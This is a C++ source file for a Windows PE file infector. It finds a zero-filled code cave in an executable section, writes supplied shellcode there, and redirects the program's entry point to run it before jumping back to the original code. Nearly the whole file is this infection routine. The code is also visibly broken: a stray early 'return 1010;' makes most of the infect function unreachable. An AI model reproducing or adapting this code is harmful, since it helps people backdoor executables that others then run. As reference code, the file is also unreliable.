#include "main.h";

using namespace std;

BinaryInfection::BinaryInfection(const char* filename, const char* shellcode){
	BinaryInfection::filename = (char*)filename;
	BinaryInfection::shellcode = (char*)shellcode;
	BinaryInfection::ntHeader = nullptr;
	BinaryInfection::fileContents = nullptr;
	cout << "BinaryInfection::filename: " << BinaryInfection::filename << endl;
}

IMAGE_SECTION_HEADER* BinaryInfection::find_code_cave(IMAGE_SECTION_HEADER* caveSection, DWORD&  caveLoc, DWORD& caveSize){
	bool caveFound = false;
	unsigned int shellCodeLen = strlen(shellcode);
	cout << "ntHeader: " << ntHeader << endl;
	IMAGE_SECTION_HEADER* section = (IMAGE_SECTION_HEADER*)((char*)ntHeader + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++, section++)
	{
		// Output the section name
		// (did it this way because section's name maximum     
		//  length is 8, and a null at the end is not mandatory)
		char secName[9] = { 0 };
		lstrcpyn(secName, (char*)section->Name, 8);
		cout << "Section: " << secName << endl;

		// If it has the EXECUTE flag it means it will have
		// execution permissions (a code section)
		if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE)
		{
			// We already found a cave. I did not exit the loop (even
			// though there is no need) in order to continue show the
			// sections names)
			if (caveFound)
			{
				cout << " -- Executable, but a cave was already found." << endl;
				continue;
			}

			cout << " -- Executable. Looking for a free space..." << endl;

			// Iterate through each byte and find enough
			// consecutive 00 bytes
			char* current = fileContents + section->PointerToRawData;
			for (DWORD i = 0; i < section->SizeOfRawData; i++, current++) // For each byte
			{
				DWORD caveSizeCounter = 0;
				while (*current == 0) // While it is still 00
					caveSizeCounter++, i++, current++;

				// If it bigger than these 3 summed:
				//  * SAFE_DIST - 4 bytes - a safe distance so we don't overwrite other commands' parameters
				//  * shellCodeLen - the shell code length
				//  * JMP_LEN - 5 bytes - the size of the JMP instruction to the OEP
				if (caveSizeCounter >= SAFE_DIST + shellCodeLen + JMP_LEN)
				{
					caveSizeCounter -= SAFE_DIST; // Make sure we're not in the middle of an instruction

					if (!caveFound) // If we still didn't find any cave
					{
						caveFound = true;
						caveLoc = i - caveSizeCounter;
						caveSize = caveSizeCounter;
						caveSection = section;
						cout << "cave: " << caveSection << endl;
					}

					cout << " -- Cave of size " << dec << caveSizeCounter << "\tfound in\t0x" << hex << section->PointerToRawData + i - caveSizeCounter << endl;
				}
			} // For each byte
		} // Is a code section
	} // For each section
	return caveSection;
}

int BinaryInfection::infect(){
	unsigned int shellCodeLen = strlen(shellcode);
	HANDLE fileHandle = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE)
		return -11;
	return 1010;
	HANDLE fileMapHandle = CreateFileMapping(fileHandle, NULL, PAGE_READWRITE, 0, 0, 0);
	if (fileMapHandle == NULL)
		return -12;

	fileContents = (char*)MapViewOfFile(fileMapHandle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
	if (fileContents == NULL)
		return -13;

	try
	{
		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileContents;
		if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
			return -2;

		ntHeader = (IMAGE_NT_HEADERS*)(fileContents + dosHeader->e_lfanew);
		if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
			return -2;

		DWORD caveLoc, caveSize; // Final cave section, location and size
		IMAGE_SECTION_HEADER* caveSection = find_code_cave(nullptr, caveLoc, caveSize);
		if (caveSection != nullptr) {
			cout << endl << " -- Digging a cave in 0x" << hex << caveSection->PointerToRawData + caveLoc
				<< " (0x" << ntHeader->OptionalHeader.ImageBase + caveSection->VirtualAddress + caveLoc << " when loaded)..." << endl;

			char* cavePtr = fileContents + caveSection->PointerToRawData + caveLoc;
			memcpy(cavePtr, shellcode, shellCodeLen); // Writing the shellcode
			cavePtr += shellCodeLen; // Advance the pointer
			*(cavePtr++) = 0xE9; // JMP opcode
			*(DWORD*)cavePtr = (ULONG32)(ntHeader->OptionalHeader.AddressOfEntryPoint - (caveSection->VirtualAddress + caveLoc + shellCodeLen + 5)); // Jump relative address
			cout << " -- Setting entry point to cave (OEP = 0x" << hex << ntHeader->OptionalHeader.AddressOfEntryPoint
				<< ", when loaded = 0x" << ntHeader->OptionalHeader.ImageBase + ntHeader->OptionalHeader.AddressOfEntryPoint << ")..." << endl;
			ntHeader->OptionalHeader.AddressOfEntryPoint = caveSection->VirtualAddress + caveLoc;
			
			DWORD neededSize = caveLoc + shellCodeLen + 5 + 1;
			if (caveSection->Misc.VirtualSize <= neededSize)
				caveSection->Misc.VirtualSize = neededSize;

			cout << endl << "Success!" << endl;
		}
		else
			cout << endl << "Failed. A valid PE, but couldn't find a cave." << endl;
	}
	catch (...) {
		return -3;
	}

	UnmapViewOfFile(fileContents);
	CloseHandle(fileMapHandle);
	CloseHandle(fileHandle);
	return 0;
}





